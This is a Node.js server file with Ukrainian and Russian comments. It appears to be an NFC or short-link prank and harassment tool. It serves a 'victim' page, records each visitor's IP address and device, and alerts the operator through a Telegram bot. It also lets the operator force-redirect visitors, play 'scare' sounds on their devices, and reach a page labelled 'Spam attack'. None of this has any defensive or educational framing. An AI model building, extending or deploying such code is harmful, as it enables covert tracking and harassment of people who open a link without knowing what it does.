const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
global.io = io;

const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// --- КОНФІГУРАЦІЯ ---
const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');

if (!fs.existsSync(UPLOAD_DIR)) {
    console.log('📂 Creating upload directory...');
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

app.use(express.json());
app.use(express.static('public'));

// --- MULTER ---
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname);
        const name = `${Date.now()}-${uuidv4().slice(0, 8)}${ext}`;
        cb(null, name);
    }
});
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } 
});

// ====================================
// ІНІЦІАЛІЗАЦІЯ ГЛОБАЛЬНИХ ЗМІННИХ
// ====================================
global.sessions = {};      
global.activeVictims = {}; 
global.shortLinks = {};

console.log('✅ Global variables initialized');

// ====================================
// ПІДКЛЮЧЕННЯ NFC БОТА
// ====================================
let notifyNewVictim = null;
try {
    console.log('🤖 Loading NFC Control Bot...');
    const nfcModule = require('./nfc-logic.js');
    if (nfcModule.notifyNewVictim) {
        notifyNewVictim = nfcModule.notifyNewVictim;
    }
    console.log('✅ NFC Control Bot loaded successfully');
} catch (e) {
    console.error('❌ NFC Bot error:', e.message);
}

// --- ДОПОМІЖНІ ФУНКЦІЇ ---

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    if (global.shortLinks[result]) return generateShortCode();
    return result;
}

function parseDevice(ua) {
    if (!ua) return "Unknown";
    if (ua.includes('Android')) return "📱 Android";
    if (ua.includes('iPhone')) return "🍏 iPhone";
    if (ua.includes('Windows')) return "💻 PC";
    return "📱 Device";
}

// --- МАРШРУТИ ---

// API для получения session ID по короткому коду
app.get('/api/resolve/:shortCode', (req, res) => {
    const code = req.params.shortCode;
    const sessionId = global.shortLinks[code];
    
    if (sessionId) {
        res.json({ success: true, sessionId: sessionId });
    } else {
        res.json({ success: false, error: 'Session not found' });
    }
});

// Головна сторінка -> victim.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

// Редірект по короткому коду
app.get('/:shortCode', (req, res) => {
    const code = req.params.shortCode;
    
    // Ігноруємо статичні файли
    if (code === 'favicon.ico' || code.includes('.')) {
        return res.sendStatus(404);
    }

    const sessionId = global.shortLinks[code];
    if (sessionId) {
        // Отправляем victim.html напрямую с коротким кодом вместо редиректа
        res.sendFile(path.join(__dirname, 'public', 'victim.html'));
    } else {
        res.status(404).send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Не найдено</title>
    <style>
        body {
            background: #1a1a1a;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        h1 {
            font-size: 120px;
            margin: 0;
            color: #ff4444;
        }
        p {
            font-size: 24px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>404</h1>
        <p>Ссылка не найдена</p>
    </div>
</body>
</html>
        `);
    }
});

// --- SOCKET.IO ---
io.on('connection', (socket) => {
    
    // Адмін (не використовується, але залишаємо для сумісності)
    socket.on('join-room-admin', (roomId) => {
        socket.join(roomId);
        sendVictimListToAdmin(roomId);
    });

    socket.on('trigger-redirect', (data) => {
        io.to(data.roomId).emit('force-redirect', { url: data.url });
    });

    socket.on('trigger-scare', (roomId) => {
        io.to(roomId).emit('play-sound');
    });

    // Жертва
    socket.on('join-room-victim', (data) => {
        const roomId = data.roomId;
        socket.join(roomId);
        
        const ip = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address).split(',')[0].trim();
        
        const victimInfo = {
            socketId: socket.id,
            roomId: roomId,
            device: parseDevice(data.userAgent),
            ip: ip
        };
        
        global.activeVictims[socket.id] = victimInfo;

        if (global.sessions[roomId]) {
            global.sessions[roomId].totalVictims++;
            broadcastUpdate(roomId);
            
            // Отправляем уведомление в Telegram бот
            if (notifyNewVictim) {
                notifyNewVictim(roomId, victimInfo);
            }
        }

        sendVictimListToAdmin(roomId);
        io.to(roomId).emit('admin-alert', { msg: 'NEW VICTIM!' });
    });

    socket.on('disconnect', () => {
        const v = global.activeVictims[socket.id];
        if (v) {
            delete global.activeVictims[socket.id];
            sendVictimListToAdmin(v.roomId);
        }
    });
});

function sendVictimListToAdmin(roomId) {
    const list = Object.values(global.activeVictims).filter(v => v.roomId === roomId);
    io.to(roomId).emit('update-victim-list', list);
}

function broadcastUpdate(roomId) {
    const s = global.sessions[roomId];
    if (!s) return;

    const currentSound = s.sound || '';
    const currentImage = s.image || '';

    s.lastActiveAt = Date.now();
    
    // Убрали auto - звук только по кнопке
    io.to(roomId).emit('update-media', { 
        sound: currentSound, 
        image: currentImage
    });
}

// --- START ---
http.listen(PORT, '0.0.0.0', () => {
    console.log('╔════════════════════════════════╗');
    console.log('║   🚀 NFC SERVER v3.0 RUNNING  ║');
    console.log('╚════════════════════════════════╝');
    console.log('');
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`📱 Telegram Bot: Active`);
    console.log(`📄 Available pages:`);
    console.log(`   • /victim.html - Victim page`);
    console.log(`   • /volumeshader_bm.html - Spam attack`);
    console.log('');
    console.log('✅ All systems ready!');
});
